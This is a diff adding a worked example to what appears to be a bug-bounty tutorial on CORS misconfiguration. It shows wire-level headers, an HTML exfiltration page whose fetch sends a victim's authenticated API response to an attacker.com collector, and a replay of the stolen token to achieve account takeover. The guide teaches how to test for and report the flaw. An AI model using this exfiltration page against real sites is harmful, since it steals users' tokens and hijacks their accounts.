@@ -450,6 +450,57 @@ The browser allowed `attacker.com` to **read** the credentialed response *only b
 
 > **If this → then that:** the exfiltrated body contains a **session token / API key / password-reset token** → escalate to account takeover (§12). It contains **PII / messages / financial data** → that's a data-breach impact on its own (High). It contains the **anti-CSRF token** → chain a state-changing CSRF (§13).
 
+## 11.1 Worked example — a complete CORS → account-takeover attack (full wire-level transcript)
+
+> *In plain words:* the sections above tell you *what* each step is; this shows the *exact headers on the wire*, in order, so you can recognise every stage on a real target. Read it as one continuous session: **baseline probe → confirm the vulnerable header pair on the wire → the victim visits your page and their secret lands in your collector → replay the secret to log in as them.** This is the arc every paid CORS bug follows: *reflect + `ACAC:true` → read secret → become the user.*
+
+**Target:** `https://api.target.com`. One account we own, **A** (`a-poc@inbox.test`), plays the victim; `https://attacker.com` is an origin we control. Goal: prove that `attacker.com` can read A's authenticated secret and take over A — using only our own account.
+
+**STEP 0 — baseline probe (§4): is an attacker origin reflected *with credentials*?** Send our evil origin and read exactly what comes back:
+```http
+GET /api/me HTTP/1.1                          →  HTTP/1.1 200 OK
+Host: api.target.com                              Access-Control-Allow-Origin: https://attacker.com   ← REFLECTED us
+Origin: https://attacker.com                      Access-Control-Allow-Credentials: true              ← THE multiplier ⭐
+Cookie: session=<A_SESSION>                        Content-Type: application/json
+                                                  {"email":"a-poc@inbox.test","apiToken":"sk_live_9f3a...","plan":"pro"}
+```
+→ The server **echoed `attacker.com` into `Access-Control-Allow-Origin`** *and* set `Access-Control-Allow-Credentials: true`. Confirm it's true reflection, not a coincidence, by sending two more random origins (`https://a1b2c3.test`, `https://x.attacker.test`) — each is echoed verbatim → **reflect-any + credentials.** And the body holds a real secret (`apiToken`). This is the vulnerable pattern; everything else is delivery.
+
+**STEP 1 — host the exfil page on the origin we control (§11).** `attacker.com/exfil.html`:
+```html
+<!DOCTYPE html><html><body><script>
+  fetch('https://api.target.com/api/me', { credentials: 'include' })   // browser attaches the victim's cookies
+    .then(r => r.text())
+    .then(d => fetch('https://attacker.com/collect?d=' + encodeURIComponent(d)));  // ship it to our collector
+</script></body></html>
+```
+
+**STEP 2 — the victim visits (we simulate with our own logged-in A).** Log in as **A** in a normal browser, then open `https://attacker.com/exfil.html` in the same browser. On the wire, A's browser makes the cross-origin request and — *because* of the Step-0 misconfig — is allowed to read the reply:
+```http
+GET /api/me HTTP/1.1                          →  HTTP/1.1 200 OK
+Host: api.target.com                              Access-Control-Allow-Origin: https://attacker.com
+Origin: https://attacker.com                      Access-Control-Allow-Credentials: true
+Cookie: session=<A_SESSION>   ← sent automatically   {"email":"a-poc@inbox.test","apiToken":"sk_live_9f3a...","plan":"pro"}
+```
+Our collector logs the hit:
+```
+attacker.com/collect  ?d={"email":"a-poc@inbox.test","apiToken":"sk_live_9f3a...","plan":"pro"}   ← A's secret, read by attacker.com ⭐
+```
+→ `attacker.com` just read A's **private, authenticated** response. SOP would normally forbid this; the CORS misconfig permitted it. **No XSS on the target was needed** — A merely opened our page while logged in.
+
+**STEP 3 — turn the secret into takeover (§12).** The leaked value is an API token, so prove it authenticates as A — from a *clean* client with no session, just the stolen token:
+```http
+GET /api/me HTTP/1.1                          →  HTTP/1.1 200 OK
+Host: api.target.com                              {"email":"a-poc@inbox.test","plan":"pro","id":7001}
+Authorization: Bearer sk_live_9f3a...             ← the server treats us AS A → ATO confirmed ⭐
+(no Cookie)
+```
+→ The stolen token logs us in as A with no cookie, no password. **One page-visit by a logged-in victim = full account takeover.** That is the difference between "High: data exposure" and "Critical: cross-origin ATO."
+
+**STEP 4 — STOP and report (§20).** Everything used **our own** account A and a **benign collector**; we redact the live token in the write-up (show `sk_live_9f3a…`, mask the rest) and never touched a real user. Report title: *"CORS origin-reflection + `ACAC:true` on `GET /api/me` → cross-origin theft of API token → account takeover of any logged-in user."* Lead with the header pair from Step 0 (the root cause), the collector hit from Step 2 (the cross-origin read), and the token replay from Step 3 (the ATO). That sequence **is** the finding; a reflected header alone (no `ACAC`, no secret, no browser read) is only Informational.
+
+> **Read the pattern, not just the bytes:** every paid CORS bug is this shape — *baseline shows reflect(or `null`)+`ACAC:true` on the wire → a `fetch(..,{credentials:'include'})` from your origin reads the victim's secret → the secret grants ATO → prove it with your own account, redact, stop.* Swap the reflected origin for **`null`** (sandboxed iframe, §7), a **suffix-bypass** origin (§8), or a **taken-over subdomain** (§9) and the middle changes but the arc is identical.
+
 ---
 
 # 12. Account Takeover via CORS
